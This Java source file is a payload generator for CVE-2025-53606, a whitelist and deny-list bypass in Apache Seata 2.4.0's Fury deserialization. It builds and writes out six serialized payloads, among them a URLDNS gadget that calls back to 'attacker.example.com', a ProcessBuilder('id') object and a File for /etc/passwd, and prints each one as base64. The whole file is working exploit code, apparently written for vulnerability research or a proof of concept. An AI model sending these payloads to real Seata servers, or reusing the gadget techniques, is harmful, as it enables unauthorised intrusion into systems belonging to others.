import org.apache.fury.Fury;
import org.apache.fury.config.CompatibleMode;
import org.apache.fury.config.Language;

import java.io.File;
import java.io.FileOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.Base64;
import java.util.HashMap;
import java.util.LinkedHashMap;

/**
 * Payload Generator for CVE-2025-53606
 *
 * Generates Fury-serialized payloads that bypass the broken ClassChecker
 * in Apache Seata 2.4.0's FurySerializerFactory.
 *
 * The payloads contain classes NOT on the Seata whitelist, which should be
 * rejected by a working class checker but are accepted due to the bug
 * (lambda returns boolean, Fury ignores return value, only throws matter).
 *
 * Uses the EXACT same Fury configuration as the vulnerable server:
 * - Language.JAVA
 * - requireClassRegistration(false)
 * - withRefTracking(true)
 * - withCompatibleMode(CompatibleMode.COMPATIBLE)
 */
public class PayloadGenerator {

    private static Fury createFury() {
        return Fury.builder()
                .withLanguage(Language.JAVA)
                .requireClassRegistration(false)
                .withRefTracking(true)
                .withCompatibleMode(CompatibleMode.COMPATIBLE)
                .build();
    }

    /**
     * Payload 1: java.io.File - a simple non-whitelisted JDK class.
     * Proves arbitrary class deserialization bypass.
     */
    static byte[] generateFilePayload() {
        Fury fury = createFury();
        File file = new File("/etc/passwd");
        return fury.serialize(file);
    }

    /**
     * Payload 2: HashMap with non-whitelisted key types.
     * HashMap deserialization calls put() which calls hashCode() on keys.
     * Using a LinkedHashMap<String, File> to prove non-whitelisted value types.
     */
    static byte[] generateHashMapPayload() {
        Fury fury = createFury();
        LinkedHashMap<String, Object> map = new LinkedHashMap<>();
        map.put("proof", new File("/tmp/cve-2025-53606-proof"));
        map.put("class", new java.util.concurrent.atomic.AtomicInteger(42));
        return fury.serialize(map);
    }

    /**
     * Payload 3: HashMap<URL, String> - DNS callback gadget.
     * When HashMap.put() is called during deserialization, URL.hashCode()
     * triggers a DNS lookup if hashCode field == -1.
     *
     * Note: Fury may not preserve the URLStreamHandler (transient field),
     * which could cause NPE. This is still a valid proof since the NPE
     * occurs AFTER the class is loaded (proving whitelist bypass).
     */
    static byte[] generateURLDNSPayload(String callbackHost) {
        Fury fury = createFury();
        try {
            URL url = new URL("http://" + callbackHost + "/cve-2025-53606");

            // Need to craft HashMap carefully:
            // 1. Create URL and add to HashMap (triggers hashCode, caches it)
            HashMap<URL, String> map = new HashMap<>();
            map.put(url, "exploit");

            // 2. Use reflection to reset hashCode to -1
            //    This forces recalculation on deserialization
            Field hashCodeField = URL.class.getDeclaredField("hashCode");
            hashCodeField.setAccessible(true);
            hashCodeField.set(url, -1);

            return fury.serialize(map);
        } catch (Exception e) {
            System.err.println("Error generating URL DNS payload: " + e.getMessage());
            e.printStackTrace();
            return null;
        }
    }

    /**
     * Payload 4: javax.script.ScriptEngineManager
     * Non-whitelisted class that triggers ServiceLoader scanning on construction.
     * With Fury using Unsafe.allocateInstance(), constructor won't run,
     * but the class itself being loaded proves the whitelist bypass.
     */
    static byte[] generateScriptEnginePayload() {
        Fury fury = createFury();
        try {
            javax.script.ScriptEngineManager mgr = new javax.script.ScriptEngineManager();
            return fury.serialize(mgr);
        } catch (Exception e) {
            System.err.println("Error generating ScriptEngine payload: " + e.getMessage());
            e.printStackTrace();
            return null;
        }
    }

    /**
     * Payload 5: Nested HashMap with ProcessBuilder (RCE indicator class).
     * ProcessBuilder is on the deny list but the deny list is never checked.
     * Fury will serialize its fields (command list, directory, etc.).
     * The class being deserialized proves both whitelist bypass AND deny list bypass.
     */
    static byte[] generateProcessBuilderPayload() {
        Fury fury = createFury();
        try {
            ProcessBuilder pb = new ProcessBuilder("id");
            pb.directory(new File("/tmp"));
            HashMap<String, Object> map = new HashMap<>();
            map.put("rce_indicator", pb);
            return fury.serialize(map);
        } catch (Exception e) {
            System.err.println("Error generating ProcessBuilder payload: " + e.getMessage());
            e.printStackTrace();
            return null;
        }
    }

    /**
     * Payload 6: Runtime class reference wrapped in a map.
     * java.lang.Runtime is explicitly in the DENY list.
     * Deserialization of this class proves the deny list is not enforced.
     */
    static byte[] generateRuntimeRefPayload() {
        Fury fury = createFury();
        try {
            // We can't serialize Runtime.getRuntime() directly (singleton),
            // but we can serialize a reference to it in a map
            HashMap<String, Object> map = new HashMap<>();
            map.put("runtime_class_name", "java.lang.Runtime");
            // Include a Thread object - non-whitelisted
            map.put("thread_info", Thread.currentThread().getThreadGroup());
            return fury.serialize(map);
        } catch (Exception e) {
            System.err.println("Error generating Runtime ref payload: " + e.getMessage());
            e.printStackTrace();
            return null;
        }
    }

    public static void main(String[] args) throws Exception {
        String outputDir = args.length > 0 ? args[0] : "/tmp/payloads";
        String callbackHost = args.length > 1 ? args[1] : "attacker.example.com";

        new File(outputDir).mkdirs();

        System.out.println("=== CVE-2025-53606 Fury Payload Generator ===");
        System.out.println("Output directory: " + outputDir);
        System.out.println();

        // Generate Payload 1: File object
        System.out.print("Generating payload 1 (java.io.File)... ");
        try {
            byte[] p1 = generateFilePayload();
            writePayload(outputDir + "/payload_file.bin", p1);
            System.out.println("OK (" + p1.length + " bytes)");
            System.out.println("  BASE64:" + Base64.getEncoder().encodeToString(p1));
        } catch (Exception e) {
            System.out.println("FAILED: " + e.getMessage());
        }

        // Generate Payload 2: HashMap with non-whitelisted values
        System.out.print("Generating payload 2 (HashMap with File+AtomicInteger)... ");
        try {
            byte[] p2 = generateHashMapPayload();
            writePayload(outputDir + "/payload_hashmap.bin", p2);
            System.out.println("OK (" + p2.length + " bytes)");
            System.out.println("  BASE64:" + Base64.getEncoder().encodeToString(p2));
        } catch (Exception e) {
            System.out.println("FAILED: " + e.getMessage());
        }

        // Generate Payload 3: URL DNS callback
        System.out.print("Generating payload 3 (URL DNS callback)... ");
        try {
            byte[] p3 = generateURLDNSPayload(callbackHost);
            if (p3 != null) {
                writePayload(outputDir + "/payload_urldns.bin", p3);
                System.out.println("OK (" + p3.length + " bytes)");
                System.out.println("  BASE64:" + Base64.getEncoder().encodeToString(p3));
            } else {
                System.out.println("FAILED (null)");
            }
        } catch (Exception e) {
            System.out.println("FAILED: " + e.getMessage());
        }

        // Generate Payload 4: ScriptEngineManager
        System.out.print("Generating payload 4 (ScriptEngineManager)... ");
        try {
            byte[] p4 = generateScriptEnginePayload();
            if (p4 != null) {
                writePayload(outputDir + "/payload_scriptengine.bin", p4);
                System.out.println("OK (" + p4.length + " bytes)");
                System.out.println("  BASE64:" + Base64.getEncoder().encodeToString(p4));
            } else {
                System.out.println("FAILED (null)");
            }
        } catch (Exception e) {
            System.out.println("FAILED: " + e.getMessage());
        }

        // Generate Payload 5: ProcessBuilder (deny-listed class)
        System.out.print("Generating payload 5 (ProcessBuilder - deny list bypass)... ");
        try {
            byte[] p5 = generateProcessBuilderPayload();
            if (p5 != null) {
                writePayload(outputDir + "/payload_processbuilder.bin", p5);
                System.out.println("OK (" + p5.length + " bytes)");
                System.out.println("  BASE64:" + Base64.getEncoder().encodeToString(p5));
            } else {
                System.out.println("FAILED (null)");
            }
        } catch (Exception e) {
            System.out.println("FAILED: " + e.getMessage());
        }

        // Generate Payload 6: ThreadGroup (non-whitelisted)
        System.out.print("Generating payload 6 (ThreadGroup reference)... ");
        try {
            byte[] p6 = generateRuntimeRefPayload();
            if (p6 != null) {
                writePayload(outputDir + "/payload_threadgroup.bin", p6);
                System.out.println("OK (" + p6.length + " bytes)");
                System.out.println("  BASE64:" + Base64.getEncoder().encodeToString(p6));
            } else {
                System.out.println("FAILED (null)");
            }
        } catch (Exception e) {
            System.out.println("FAILED: " + e.getMessage());
        }

        System.out.println();
        System.out.println("=== Payload generation complete ===");
    }

    private static void writePayload(String path, byte[] data) throws Exception {
        try (FileOutputStream fos = new FileOutputStream(path)) {
            fos.write(data);
        }
    }
}
